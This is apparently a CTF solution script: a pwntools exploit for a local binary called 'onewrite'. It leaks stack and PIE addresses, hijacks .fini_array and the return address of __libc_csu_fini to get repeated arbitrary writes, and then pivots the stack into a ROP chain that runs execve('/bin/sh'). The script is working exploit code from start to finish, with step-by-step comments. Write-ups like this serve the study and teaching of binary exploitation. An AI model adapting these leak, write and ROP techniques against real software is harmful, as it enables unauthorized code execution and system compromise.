import pwn
import struct


target = pwn.process("./onewrite")

target_elf = pwn.ELF("onewrite")

# Stack Leak
target.recvuntil(b'>')
target.sendline(b'1')
stack_leak = target.recvline()
stack_leak = int(stack_leak, 16)

# Calculate the return address of the do_overwrite function
do_overwrite_ret_addr = stack_leak + 0x18

# Do a partial overwrite of the lsb of do_overwrite's return address
# with 0x04 to return to the starting address of do_leak
target.recvuntil(b'address :')
target.send(str(do_overwrite_ret_addr).encode())
target.recvuntil(b'data :')
target.send(struct.pack("b", 0x04))

# Leak the PIE address
target.recvuntil(b'>')
target.sendline(b'2')
pie_leak = target.recvline()
pie_leak = int(pie_leak, 16)

# calculate PIE base
pie_base = pie_leak - target_elf.symbols['do_leak']

print(f"pie base: {hex(pie_base)}")

# Remember, the return address is pushed onto the stack every time do_leak() calls do_overwrite()
# Just because we overwrote it once, does not mean we have an infinite loop over do_leak -> do_overwrite
# We would have to overwrite it everytime if we wanted that to be the case. 
# But, we only get one write, each iteration, so we wouldn't be able to do anything else
# Instead we will overwrite the fini_array to call do_overwrite()

# Calculate the address of the fini_arr table, and the __libc_csu_fini function using the PIE base

# This is the equivalent of taking the .fini_array address from 'info file' in gdb, and subtracting the base address of the binary from vmmap
# Looking at .fini_array in 'info file' as well, we can see that it is 0x10 bytes long, meaning there are two entries
fini_arr_addr = pie_base + target_elf.symbols['__do_global_dtors_aux_fini_array_entry']
# __libc_csu_fini is responsible for calling the functions in the .fini_array
# So calling it will give us another run through the .fini_array entries
csu_fini = pie_base + target_elf.symbols['__libc_csu_fini']

# Calculate the return address for __libc_csu_fini
csu_fini_ret_addr = stack_leak - 72

# Calculate the position of do_overwrite
do_overwrite = pie_base + target_elf.symbols['do_overwrite']

# Write over the two entries in _fini_arr table with do_overwrite, and restart the loop
# Entries from the .fini_array are called in reverse order, so we want to overwrite the second entry first
target.recvuntil(b'address :')
target.send(str(fini_arr_addr + 8).encode())
target.recvuntil(b'data :')
target.send(struct.pack("<Q", do_overwrite))

# Then overwrite the first entry
target.recvuntil(b'address :')
target.send(str(fini_arr_addr).encode())
target.recvuntil(b'data :')
target.send(struct.pack("<Q", do_overwrite))

target.recvuntil(b'address :')
target.send(str(csu_fini_ret_addr).encode())
target.recvuntil(b'data :')
target.send(struct.pack("<Q", csu_fini))

# Increment stack address of saved rip for __libc_csu_fini due to new iteration of loop
csu_fini_ret_addr += 8

# Establish rop gadgets and '/bin/sh' address
pop_rdi = pie_base + 0x84fa
pop_rsi = pie_base + 0xd9f2
pop_rdx = pie_base + 0x484c5
pop_rax = pie_base + 0x460ac
syscall = pie_base + 0x917c
bin_sh_adr = pie_leak + 0x2aa99b

# 0x00000000000106f3 : add rsp, 0xd0 ; pop rbx ; ret
pivot_gadget = pie_base + 0x106f3

# Function which we will use to write Qwords using loop
def write_QWORD(adr, val):
    global csu_fini_ret_addr
    target.recvuntil(b'address :')
    target.send(str(adr).encode())
    target.recvuntil(b'data :')
    target.send(struct.pack("<Q", val))

    target.recvuntil(b'address :')
    target.send(str(csu_fini_ret_addr).encode())
    target.recvuntil(b'data :')
    target.send(struct.pack("<Q", csu_fini))
    csu_fini_ret_addr += 8

# First write '/bin/sh' to the designated place in memory
write_QWORD(bin_sh_adr, struct.unpack("<Q", b'/bin/sh\x00')[0])

# Write the ROP chain
write_QWORD(stack_leak + 0xd0, pop_rdi)
write_QWORD(stack_leak + 0xd8, bin_sh_adr)
write_QWORD(stack_leak + 0xe0, pop_rsi)
write_QWORD(stack_leak + 0xe8, 0)
write_QWORD(stack_leak + 0xf0, pop_rdx)
write_QWORD(stack_leak + 0xf8, 0)
write_QWORD(stack_leak + 0x100, pop_rax)
write_QWORD(stack_leak + 0x108, 59)
write_QWORD(stack_leak + 0x110, syscall)

# Write the ROP pivot gadget to the return address of do_overwrite, which will trigger the rop chain
target.recvuntil(b'address :')
target.send(str(stack_leak - 0x10).encode())
target.recvuntil(b'data :')
target.send(struct.pack("<Q", pivot_gadget))

target.interactive()